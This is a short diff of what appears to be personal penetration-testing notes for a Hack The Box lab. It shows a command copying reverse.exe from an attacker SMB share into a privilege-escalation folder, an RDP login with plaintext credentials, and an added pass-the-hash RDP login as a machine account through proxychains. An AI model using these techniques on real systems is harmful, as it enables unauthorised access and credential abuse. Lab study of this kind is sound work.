@@ -217,6 +217,7 @@ copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 ```
 xfreerdp /v:10.10.25.227 /u:Wade /p:parzival /cert:ignore /drive:/usr/share/windows-resources,share /dynamic-resolution
+proxychains -f proxy9051.conf xfreerdp +clipboard /v:10.10.120.5 /d:RLAB /u:'SQL01$' /pth:47b071ssddff02d0f06770137996c /sec:nla /cert:ignore /drive:/home/kali/Documents/htb/rasta/map,share
 ```
 
 **Credit**
